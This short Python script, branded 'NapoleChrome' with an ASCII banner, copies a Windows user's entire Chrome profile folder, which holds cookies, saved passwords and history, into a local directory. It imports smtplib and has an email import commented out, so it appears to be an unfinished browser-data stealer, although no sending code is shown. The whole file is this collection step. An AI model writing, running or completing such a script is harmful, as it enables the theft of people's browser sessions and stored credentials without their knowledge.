import shutil, os, smtplib, colorama
#from email.message import EmailMessage

print(colorama.Fore.BLUE + '''

 _   _                   _      _____ _                              
| \ | |                 | |    /  __ \ |                             
|  \| | __ _ _ __   ___ | | ___| /  \/ |__  _ __ ___  _ __ ___   ___ 
| . ` |/ _` | '_ \ / _ \| |/ _ \ |   | '_ \| '__/ _ \| '_ ` _ \ / _ \\
| |\  | (_| | |_) | (_) | |  __/ \__/\ | | | | | (_) | | | | | |  __/
\_| \_/\__,_| .__/ \___/|_|\___|\____/_| |_|_|  \___/|_| |_| |_|\___|
            | |                                                      
            |_|                                                      

''')

print(colorama.Fore.YELLOW + "Copying the files...")

src = os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome"

shutil.copytree(src, "a" + r"\Chrome")
print(colorama.Fore.GREEN + "Process succed")
